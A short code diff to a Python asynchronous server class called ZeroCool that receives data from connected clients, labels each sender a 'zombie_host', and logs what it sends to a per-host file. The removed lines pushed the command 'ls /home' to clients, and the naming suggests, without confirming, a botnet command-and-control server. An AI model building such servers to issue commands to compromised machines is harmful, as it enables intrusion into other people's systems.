@@ -46,8 +46,7 @@ class ZeroCool:
                 data = await self.loop.sock_recv(client, 10000)
                 zombie_host = str(addr[0])
 
-                if 'gnarly' in str(data):
-                    self.broadcast(client, b'ls /home')
+                self.broadcast(client, data)
 
                 with open(zombie_host, 'a') as data_store:
                     data_store.write('\n' + str(data))
